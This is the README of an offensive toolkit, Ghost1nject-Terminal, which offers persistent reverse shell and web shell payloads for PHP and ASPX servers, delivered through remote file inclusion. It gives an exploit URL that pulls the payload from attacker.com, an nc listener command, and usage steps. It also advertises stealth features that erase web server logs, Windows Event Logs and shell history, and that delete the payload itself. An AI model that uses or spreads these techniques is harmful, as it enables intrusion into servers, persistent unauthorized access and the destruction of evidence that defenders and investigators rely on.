# Ghost1nject-Terminal

**Ghost1nject-Terminal** is a collection of compact, persistent reverse shell payloads for **RFI (Remote File Inclusion)** vulnerabilities. It provides an interactive **web-based terminal** with a side panel for system reconnaissance and a one-click reverse shell starter – all packed into a single file per platform.

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

![Ghost1nject-Terminal Demo](https://via.placeholder.com/800x400?text=Ghost1nject-Terminal+Preview)

<img width="1912" height="767" alt="image" src="https://github.com/user-attachments/assets/1a4b404c-c710-4a94-bce2-939e8c457ae9" />

## Features

- **🖥️ Interactive terminal** – run any system command, see output, command history (arrow keys), clear screen.
- **🔌 Persistent reverse shell** – auto-reconnecting (every 10s), multi-method fallback (Bash `/dev/tcp`, PHP socket, PowerShell, C# raw socket).
- **📡 Instant reconnaissance** – system info (OS, user, path, language version, server software) and **local users** (Linux shell users / Windows local accounts) displayed on the side panel.
- **🧹 Stealth mode** – automatically cleans web server logs, event logs (Windows), shell history, temporary files on start. Optional self-deletion.
- **🌍 Multi-platform** – Linux (PHP), Windows (PHP), Windows IIS (ASPX).
- **📦 Ultra-compact** – all payloads under ~10 KB.

## Payloads

| Platform | File | Language | Reverse Shell Methods |
|----------|------|----------|----------------------|
| Linux (Apache/Nginx) | `ghostinject_linux.php` | PHP | Bash `/dev/tcp` → PHP socket |
| Windows (XAMPP/Wamp/IIS+PHP) | `ghostinject_win.php` | PHP | PHP socket → PowerShell |
| Windows IIS (.NET) | `ghostinject.aspx` | ASP.NET C# | C# `TcpClient` thread |

## Quick Start

### 1. Upload / Include the payload

- Exploit an RFI vulnerability: `?page=http://attacker.com/ghostinject_linux.php`
- Or upload the file via LFI + file upload, then browse to it.

### 2. Access the web interface

- Open `http://target.com/ghostinject_xxx.php` or `http://target.com/ghostinject.aspx`.

### 3. Use the terminal

- Type any command (e.g., `whoami`, `id`, `ipconfig`, `ls -la`).
- Press `Enter` to execute – output appears in the terminal area.
- Use ⬆️ / ⬇️ arrow keys to navigate command history.
- Click **Clear** to erase the terminal screen.

### 4. Start persistent reverse shell

- On your attacker machine: `nc -lvnp 4444`
- Fill **Your IP** and **Port** in the right panel, click **Start Reverse Shell**.
- The payload will connect back and **automatically reconnect every 10 seconds** if the connection drops.

### 5. Reconnaissance

- System information and local users are shown in the right panel – no commands needed.

## Stealth Configuration

Edit the constants at the top of each payload to control stealth behaviour:

```php
// For PHP versions
define('SELF_DELETE', false);      // Set true to delete the file after execution
define('CLEAN_LOGS_ON_START', true); // Clean logs when the page loads
```

```csharp
// For ASPX version
private const bool SELF_DELETE = false;      // Schedule self-deletion
private const bool CLEAN_LOGS_ON_START = true;
```

## What logs are cleaned?

- **Linux:** Apache / Nginx access & error logs, shell history (`.bash_history`), PHP temp files.
- **Windows:** IIS logs, XAMPP logs, Event Logs (PowerShell, System, Security), PowerShell history.

## Requirements

| Version | Target Requirements |
|---------|---------------------|
| Linux PHP | PHP 5.3+ (PHP 7/8 compatible), `allow_url_include=On` (for RFI), `shell_exec`/`exec`, `fsockopen` (optional) |
| Windows PHP | PHP 5.3+ (thread-safe), `shell_exec`/`exec`, `fsockopen` (fallback) or PowerShell |
| Windows IIS | .NET Framework 2.0+ (any version), ASP.NET support, outgoing TCP allowed |

## Limitations & Notes

- The persistent reverse shell runs as a background process (PHP thread or ASPX background thread). Restarting the web server / application pool kills the shell.
- Log cleaning requires write permissions on log files (usually the web server user has them).
- Self-deletion on ASPX creates a temporary `.bat` file that may trigger antivirus.
- Some hardened environments disable `/dev/tcp` (Linux) or restrict outgoing connections (Windows firewall).

## Legal Disclaimer

This tool is for educational purposes and authorized security testing only.

Unauthorized access to computer systems is illegal. You must obtain explicit written permission from the system owner before using this tool. The author assumes no liability for any misuse or damage caused by this software.

## License

MIT – see LICENSE file.

## Contributing

Pull requests and suggestions are welcome – especially for additional fallback methods (Python, Perl, socat) without increasing payload size.

## Author Prodigium Academy

Ghost1nject – Built for penetration testing and CTF challenges.

Star this repository if you find it useful! ⭐

